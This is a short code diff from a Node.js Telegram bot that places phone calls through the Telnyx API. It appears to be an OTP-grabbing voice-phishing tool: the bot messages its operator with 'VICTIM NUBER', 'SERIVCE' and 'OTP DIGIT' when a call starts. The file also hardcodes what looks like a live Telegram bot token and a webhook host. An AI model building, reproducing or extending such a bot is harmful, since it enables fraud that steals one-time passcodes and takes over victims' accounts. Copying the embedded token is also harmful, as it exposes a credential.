@@ -4,7 +4,7 @@ const service_number = '14342338629'
 const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
 const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
-const telnyx = require('telnyx')('MY_API_KEY');
+const telnyx = require('telnyx')(MY_API_KEY);
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
 
@@ -15,11 +15,17 @@ const port = process.env.PORT || 3000;
 
 async function call (customer_number, ctx){
    console.log(ctx, 'first yayyyy')
-   bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})
+   bot.telegram.sendMessage(ctx.chat.id, 
+      `
+      CALL STARTING\n 
+      VICTIM NUBER - ${customer_number}\n 
+      SERIVCE - ${1}\n
+      OTP DIGIT - ${6}
+      `, {})
 
    // Use the Telnyx API to create a new call
    const { data: call } = await telnyx.calls.create({
-      connection_id: ENV_TELNYX_CONNECTION_ID,
+      connection_id: 'uuid',
       to: customer_number,
       from: service_number,
       webhook_url: WEBHOOK_URL
